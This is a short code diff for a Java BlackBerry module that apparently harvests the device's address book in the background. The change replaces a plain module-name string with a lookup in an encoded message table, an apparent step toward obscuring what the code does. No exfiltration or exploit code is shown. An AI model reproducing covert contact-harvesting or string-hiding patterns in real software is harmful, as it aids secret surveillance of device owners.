@@ -22,6 +22,7 @@ import net.rim.blackberry.api.pdap.BlackBerryContact;
 import net.rim.blackberry.api.pdap.BlackBerryPIMList;
 import net.rim.blackberry.api.pdap.PIMListListener;
 import net.rim.device.api.util.DataBuffer;
+import blackberry.Messages;
 import blackberry.config.ConfModule;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
@@ -53,21 +54,21 @@ public final class ModuleAddressBook extends BaseModule implements
     private static final int POOM_STRING_LOCATION = 0x10000000;
     private static final int POOM_OBJECT_RECUR = 0x80000000;
 
+    byte[] examplePacket;
+
     final int version = 0x01000000;
 
     public static String getStaticType() {
-        return "addressbook";
+        return Messages.getString("1d.0");//"addressbook";
     }
     
     public static ModuleAddressBook getInstance(){
         return (ModuleAddressBook) ModuleManager.getInstance().get(getStaticType());
     }
     
-    byte[] examplePacket;
-
     public boolean parse(ConfModule conf) {
         markup = new Markup(this);
-
+    
         setDelay(SLEEPTIME);
         setPeriod(PERIODTIME);
         return true;
